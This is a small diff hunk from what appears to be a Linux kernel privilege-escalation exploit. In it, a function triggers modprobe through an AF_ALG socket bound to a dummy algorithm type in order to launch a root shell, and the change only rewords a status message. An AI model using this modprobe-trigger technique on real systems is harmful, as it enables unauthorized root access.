@@ -459,7 +459,7 @@ void trigger_modprobe_sock(void)
 	struct sockaddr_alg sa = { .salg_family = AF_ALG, .salg_type = "dummy" };
 	int alg_fd = -1;
 
-	printf("[!] gonna trigger modprobe using AF_ALG socket and launch the root shell\n");
+	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
 	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
 	printf("[!] root shell is finished\n");
